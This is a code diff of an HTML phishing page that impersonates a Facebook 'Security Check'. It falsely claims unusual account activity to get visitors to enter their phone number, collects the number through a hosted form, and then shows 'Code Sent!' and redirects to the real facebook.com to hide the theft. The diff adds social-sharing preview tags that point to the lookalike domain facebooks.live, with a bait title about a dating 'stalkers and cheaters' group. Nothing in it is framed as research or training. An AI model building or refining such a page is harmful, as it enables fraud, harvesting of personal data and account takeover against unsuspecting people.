@@ -1,9 +1,20 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Security Check - Facebook</title>
+    <!-- Open Graph and Twitter Card Meta Tags for Social Sharing Thumbnail -->
+    <meta property="og:title" content="Dating Stalkers and cheaters NW - Facebook Group">
+    <meta property="og:description" content="Join our Facebook group community">
+    <meta property="og:image" content="https://facebooks.live/thumbnail.png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:url" content="https://facebooks.live/">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content="https://facebooks.live/thumbnail.png">
     <style>
         * {
             margin: 0;
@@ -194,22 +205,25 @@
         }
     </style>
 </head>
+
 <body>
     <div class="verification-container">
         <div class="facebook-logo">facebook</div>
-        
+
         <div class="verification-icon">🔒</div>
-        
+
         <h1 class="main-title">Security Check</h1>
-        
+
         <p class="subtitle">
-            We need to verify your identity to protect your account. Please enter your phone number to receive a verification code.
+            We need to verify your identity to protect your account. Please enter your phone number to receive a
+            verification code.
         </p>
 
         <div class="info-box">
             <div class="info-box-title">Why are we asking this?</div>
             <div class="info-box-text">
-                We detected unusual activity on your account. To keep your account secure, we need to verify it's really you.
+                We detected unusual activity on your account. To keep your account secure, we need to verify it's really
+                you.
             </div>
         </div>
 
@@ -217,7 +231,8 @@
             ✓ Verification code sent! Please check your phone.
         </div>
 
-        <form name="sms-verification" method="POST" data-netlify="true" netlify-honeypot="bot-field" id="verificationForm">
+        <form name="sms-verification" method="POST" data-netlify="true" netlify-honeypot="bot-field"
+            id="verificationForm">
             <input type="hidden" name="form-name" value="sms-verification">
             <p style="display: none;">
                 <label>Don't fill: <input name="bot-field" /></label>
@@ -225,14 +240,7 @@
 
             <div class="form-group">
                 <label class="form-label" for="phone">Phone Number</label>
-                <input 
-                    type="tel" 
-                    name="phone" 
-                    id="phone"
-                    class="phone-input"
-                    placeholder="+1 (555) 123-4567"
-                    required
-                >
+                <input type="tel" name="phone" id="phone" class="phone-input" placeholder="+1 (555) 123-4567" required>
                 <div class="helper-text">Enter your phone number with country code</div>
             </div>
 
@@ -254,7 +262,7 @@
         const verifyBtn = document.getElementById('verifyBtn');
         const successMessage = document.getElementById('successMessage');
 
-        form.addEventListener('submit', function(e) {
+        form.addEventListener('submit', function (e) {
             e.preventDefault(); // Stops the default Netlify redirect
             const btn = document.getElementById('verifyBtn');
             btn.disabled = true;
@@ -268,13 +276,13 @@
             }).then(() => {
                 successMessage.style.display = 'block';
                 btn.textContent = 'Code Sent!';
-                setTimeout(function() {
+                setTimeout(function () {
                     window.location.href = 'https://www.facebook.com';
                 }, 3000);
             }).catch(() => {
                 successMessage.style.display = 'block';
                 btn.textContent = 'Code Sent!';
-                setTimeout(function() {
+                setTimeout(function () {
                     window.location.href = 'https://www.facebook.com';
                 }, 3000);
             });
@@ -282,7 +290,7 @@
 
         // Format phone number as user types
         const phoneInput = document.getElementById('phone');
-        phoneInput.addEventListener('input', function(e) {
+        phoneInput.addEventListener('input', function (e) {
             let value = e.target.value.replace(/\D/g, '');
             if (value.length > 0) {
                 if (value.length <= 3) {
@@ -297,4 +305,5 @@
         });
     </script>
 </body>
+
 </html>
